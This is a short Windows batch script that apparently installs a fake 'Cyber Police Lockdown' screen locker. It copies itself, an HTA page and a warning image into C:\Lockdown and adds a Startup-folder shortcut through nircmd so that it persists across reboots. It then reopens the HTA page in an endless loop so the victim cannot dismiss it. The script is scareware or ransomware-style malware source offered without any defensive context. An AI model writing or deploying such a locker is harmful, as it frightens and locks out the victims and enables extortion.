@echo off
cls

mkdir C:\Lockdown
copy %0 C:\Lockdown > nul
copy index.hta C:\Lockdown > nul
copy background-warn.png C:\Lockdown > nul
nircmd.exe shortcut "C:\Lockdown\lockdown.exe" "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup" "Cyber Police Lockdown"

echo Initiating system lockdown...
echo Lockdown mode is now active.

:open
start "" /wait "index.hta"
goto :open
